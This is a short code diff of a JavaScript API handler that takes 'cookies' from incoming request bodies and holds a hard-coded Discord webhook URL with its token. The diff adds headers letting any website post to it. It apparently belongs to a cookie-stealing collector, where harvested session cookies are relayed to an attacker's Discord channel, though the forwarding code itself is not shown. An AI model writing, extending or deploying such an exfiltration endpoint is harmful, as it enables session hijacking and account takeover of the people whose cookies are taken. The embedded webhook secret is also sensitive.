@@ -3,6 +3,10 @@ import axios from 'axios';
 export default async function handler(req, res) {
   const { cookies, ...data } = req.body;
 
+  res.setHeader('Access-Control-Allow-Origin', '*'); // Allow requests from any origin
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
   const webhookUrl = 'https://discord.com/api/webhooks/1385522267672547398/fT4Ij5-fiPQGyrITXWLHfweSdhJnaOFFoAygwOCjnorfjijWLoiAnYm6DCfBCFEOnJim';
 
   try {
